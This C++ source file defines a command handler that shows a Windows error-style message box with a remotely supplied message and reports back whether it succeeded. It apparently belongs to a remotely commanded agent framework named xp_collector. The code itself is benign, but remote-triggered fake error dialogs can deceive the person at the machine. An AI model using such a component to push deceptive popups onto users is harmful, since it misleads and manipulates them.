#include <Windows.h>

#include "CommandHandlers/PopupHandler.h"
#include "Protocol/ReturnProductRequest.h"
#include "Products/PopupProduct.h"
#include "Commands/PopupCommand.h"
#include "Windows/WinUtils.h"
using namespace xp_collector;

PopupHandler::PopupHandler(std::string client_id)
	: ICommandHandler(std::move(client_id))
{
}

std::unique_ptr<IRequest> PopupHandler::handle(std::shared_ptr<BasicCommand>& command)
{
	std::shared_ptr<PopupCommand> popup_command = std::static_pointer_cast<PopupCommand>(command);
	const bool is_success = windows::do_popup("Popup", popup_command->get_message(), MB_ICONERROR);
	return std::make_unique<ReturnProductRequest>(
		RequestHeader{RequestType::ReturnProduct, m_client_id},
		std::make_unique<PopupProduct>(command->get_command_id(), is_success)
	);
}
